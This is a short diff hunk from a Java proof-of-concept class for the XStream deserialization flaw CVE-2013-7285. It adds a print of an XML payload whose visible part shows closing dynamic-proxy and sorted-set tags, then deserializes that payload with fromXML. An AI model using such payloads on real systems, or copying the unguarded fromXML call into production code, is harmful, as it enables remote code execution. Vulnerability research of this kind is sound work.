@@ -86,6 +86,7 @@ public class CVE_2013_7285 {
                 "  </dynamic-proxy>\n" +
                 "</sorted-set>";
 
+        System.out.println(xml);
         XStream xstream = new XStream();
 //        xstream.addPermission(AnyTypePermission.ANY);
         xstream.fromXML(xml);
